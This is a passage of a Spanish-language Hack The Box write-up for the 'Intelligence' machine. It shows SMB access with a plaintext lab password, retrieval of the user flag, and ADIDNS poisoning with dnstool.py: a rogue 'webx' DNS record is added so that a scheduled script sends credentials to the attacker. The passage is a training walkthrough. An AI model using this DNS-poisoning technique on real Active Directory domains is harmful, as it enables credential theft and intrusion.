  Ted.Graves                          D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:20:26 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Tiffany.Molina                      D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:51:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;3770367&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1460874&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Tiffany.Molina&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Desktop&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                  DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:51:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                 DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:51:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  user.txt                           AR       &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt;  Sun Jul &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 02:15:29 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;3770367&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1460874&lt;/span&gt; blocks available

smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get user.txt
getting file &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt of size &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; as user.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 0.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 œÄ ~/htb/intelligence ‚ùØ cat user.txt
075fbb0ca2160f9734fe17358c73b628
 œÄ ~/htb/intelligence ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;ted---user&#34;&gt;Ted - User&lt;/h1&gt;
&lt;p&gt;En el recurso &lt;code&gt;IT&lt;/code&gt; encontramos un script de powershell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;intelligence.htb&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;IT -U Tiffany.Molina &lt;span class=&#34;c1&#34;&gt;# NewIntelligenceCorpUser9876&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:50:55 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:50:55 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  downdetector.ps1                    A     &lt;span class=&#34;m&#34;&gt;1046&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:50:55 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;3770367&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1460874&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get downdetector.ps1
getting file &lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;owndetector.ps1 of size &lt;span class=&#34;m&#34;&gt;1046&lt;/span&gt; as downdetector.ps1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 3.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 œÄ ~/htb/intelligence ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Segun su contenido se ejecuta cada 5 minutos, realiza una busqueda de objetos con el nombre que contenga &lt;code&gt;web*&lt;/code&gt; dentro del AD es decir una URL que luego utiliza para realizar una solicitud, y, que segun la &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1&#34;&gt;Documentacion&lt;/a&gt; utiliza las credenciales del usuario que realiza esta solicitud, para finalmente verificar el estado, si es una respuesta no igual a &lt;a href=&#34;https://developer.mozilla.org/es/docs/Web/HTTP/Status/200&#34;&gt;&lt;strong&gt;200&lt;/strong&gt;&lt;/a&gt; envia un Correo electronico utilizando el cmdlet &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.1#example-1--send-an-email-from-one-person-to-another-person&#34;&gt;Send-MailMessage&lt;/a&gt; al usuario Ted indicando que la URL (u objeto) est√° caido.&lt;/p&gt;
&lt;p&gt;Al filtrar los objetos &lt;code&gt;web*&lt;/code&gt; esta realizando una busqueda de &lt;a href=&#34;https://mcselles.wordpress.com/2016/03/17/how-to-find-and-add-dns-record-permissions-with-powershell/&#34;&gt;registros de dominios&lt;/a&gt;, adem√°s esta haciendo uso del modulo &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2019-ps&#34;&gt;ActiveDirectory&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;c&#34;&gt;# Check web server status. Scheduled to run every 5min&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ActiveDirectory&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$record&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-ChildItem&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Where-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-like&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;web*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-WebRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Uri&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UseDefaultCredentials&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StatusCode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-ne&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;Send-MailMessage&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-From&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-To&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Subject&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; is down&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La informacion del script nos llevo a &lt;a href=&#34;https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/adidns-spoofing&#34;&gt;ADIDNS Poisoning&lt;/a&gt;, &lt;a href=&#34;https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/&#34;&gt;&amp;ldquo;Relaying&amp;rdquo; Kerberos&lt;/a&gt; y &lt;a href=&#34;http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html&#34;&gt;Delegate Your Way&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In order to function properly, Active Directory services need DNS. In that matter, Active Directory Domain Services (AD-DS) offer an integrated storage and replication service for DNS records. This is called Active Directory Integrated DNS (ADIDNS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;dns-record&#34;&gt;DNS Record&lt;/h2&gt;
&lt;p&gt;Se menciona en &lt;a href=&#34;https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing#theory&#34;&gt;ADIDNS poisoning&lt;/a&gt; que los usuarios &amp;ldquo;regulares&amp;rdquo; pueden crear objetos.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Since ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;dnstool&#34;&gt;DNSTool&lt;/h4&gt;
&lt;p&gt;Basado en eso utilizamos dnstool del toolkit de &lt;a href=&#34;https://github.com/dirkjanm/krbrelayx#krbrelayx---unconstrained-delegation-abuse-toolkit&#34;&gt;krbrelayx&lt;/a&gt;, esto con el objetivo de agregar un registro DNS. Iniciamos creando un entorno virtual con &lt;code&gt;virtualenv&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;virtualenv krbrelayx
&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; krbrelayx/bin/activate
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos un query a un &amp;ldquo;subdominio&amp;rdquo; que conocemos, el cual nos devolvio que existe y la direccion IP del registro.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ krbrelayx master ‚úó ‚ùØ python3 dnstool.py -u intelligence&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Tiffany.Molina -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; --record &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.intelligence.htb&amp;#39;&lt;/span&gt; --action query 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to host...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Binding to host
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found record dc
&lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence.htb,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MicrosoftDNS,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Record entry:
 - Type: &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Unsupported&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Serial: 74&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence.htb,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MicrosoftDNS,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Record entry:
 - Type: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Serial: 74&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 - Address: 10.10.10.248
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ krbrelayx master ‚úó ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Como sabemos existe un script que realiza una solicitud hacia direcciones que contengan &lt;code&gt;web*&lt;/code&gt;, agregamos un registro con esta palabra.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ krbrelayx master ‚úó ‚ùØ python3 dnstool.py -u intelligence&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Tiffany.Molina -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; --record &lt;span class=&#34;s1&#34;&gt;&amp;#39;webx.intelligence.htb&amp;#39;&lt;/span&gt; --action add --data 10.10.14.24 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to host...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Binding to host
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Adding new record
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; LDAP operation completed successfully
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;krbrelayx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  œÄ krbrelayx master ‚úó ‚ùØ python3 dnstool.py -u intelligence&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Tiffany.Molina -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; --record &lt;span class=&#34;s1&#34;&gt;&amp;#39;webx.intelligence.htb&amp;#39;&lt;/span&gt; --action query 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to host...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Binding to host
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found record webx
&lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;webx,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence.htb,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MicrosoftDNS,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intelligence,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Record entry:
 - Type: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Serial: 75&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 - Address: 10.10.14.24
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Confirmamos con &lt;code&gt;dig&lt;/code&gt; que dicha direccion fue registrada a nuestra direccion IP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
